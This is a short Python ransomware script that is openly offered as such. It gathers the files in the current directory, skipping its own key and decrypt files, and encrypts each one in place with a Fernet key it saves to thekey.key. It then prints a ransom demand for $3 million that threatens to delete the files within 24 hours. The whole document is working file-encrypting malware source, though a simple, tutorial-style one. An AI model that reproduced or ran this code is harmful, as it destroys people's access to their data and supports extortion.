import os
from cryptography.fernet import Fernet 

files = []

#search for files in our directory, only specifically including files, ignoring the key

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py": 
        continue 
    if os.path.isfile(file):
        files.append(file) 

print(files) 


key = Fernet.generate_key() 

#open a new file called the key.key, calling it thekey, then writing our key value to the file

with open("thekey.key", "wb") as thekey: 
    thekey.write(key) 

#open files, encrypts, then writes back to the file

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read() 
    contents_encrypted = Fernet(key).encrypt(contents) 
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted) 

print("Your files have been encrypted! Give Tony Lamboy $3 million to get your data back or I will delete the files in 24 hours.\n") 
